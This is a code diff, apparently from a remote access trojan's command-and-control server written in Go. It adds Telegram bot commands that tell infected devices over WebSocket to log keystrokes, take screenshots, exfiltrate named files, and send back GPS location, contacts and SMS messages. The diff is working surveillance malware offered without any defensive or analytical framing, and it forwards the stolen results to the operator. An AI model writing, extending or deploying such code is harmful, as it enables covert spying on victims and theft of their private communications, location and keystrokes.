@@ -69,13 +69,40 @@ func startBot(ctx context.Context) {
 
 		switch {
 		case msg == "/start":
-			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Wybierz urządzenie:"})
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Available commands:\n/start_keylog - Start keylogging\n/stop_keylog - Stop keylogging\n/screenshot - Take screenshot\n/send_file /path/to/file - Exfil specific file\n/location - Get GPS location\n/contacts - Exfil contacts\n/sms - Exfil SMS\n/help - Show this menu"})
+		case strings.Contains(msg, "start_keylog"):
+			broadcastWS("start_keylog")
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylog start command sent."})
+		case strings.Contains(msg, "stop_keylog"):
+			broadcastWS("stop_keylog")
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylog stop command sent."})
 		case strings.Contains(msg, "screenshot"):
 			broadcastWS("screenshot")
 			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Screenshot command sent."})
 		case strings.Contains(msg, "send_file"):
-			broadcastWS("send_file")
-			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "File exfil triggered."})
+			// Extract path if provided after "send_file "
+			parts := strings.Fields(msg)
+			if len(parts) > 2 {
+				path := strings.Join(parts[2:], " ")
+				broadcastWS(fmt.Sprintf("send_file %s", path))
+				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("File exfil triggered for: %s", path)})
+			} else {
+				broadcastWS("send_file")
+				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Generic file exfil triggered."})
+			}
+		case strings.Contains(msg, "location"):
+			broadcastWS("location")
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Location request sent."})
+		case strings.Contains(msg, "contacts"):
+			broadcastWS("contacts")
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Contacts exfil triggered."})
+		case strings.Contains(msg, "sms"):
+			broadcastWS("sms")
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "SMS exfil triggered."})
+		case strings.Contains(msg, "help") || msg == "/help":
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Available commands:\n/start_keylog\n/stop_keylog\n/screenshot\n/send_file [path]\n/location\n/contacts\n/sms\n/help"})
+		default:
+			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Unknown command. Type /help for options."})
 		}
 	})
 
@@ -127,14 +154,19 @@ func wsHandler(w http.ResponseWriter, r *http.Request) {
 			conn.Close()
 			break
 		}
-		log.Printf("RAT → %s", string(msg))
-		sendMsg("RAT: " + string(msg))
+		incoming := string(msg)
+		log.Printf("RAT → %s", incoming)
+		sendMsg("RAT: " + incoming)
 	}
 }
 
 func broadcastWS(cmd string) {
+	log.Printf("Broadcasting command: %s to %d clients", cmd, len(clients))
 	for conn := range clients {
-		conn.WriteMessage(websocket.TextMessage, []byte(cmd))
+		if err := conn.WriteMessage(websocket.TextMessage, []byte(cmd)); err != nil {
+			log.Printf("Failed to send to client: %v", err)
+			delete(clients, conn)
+		}
 	}
 }
 
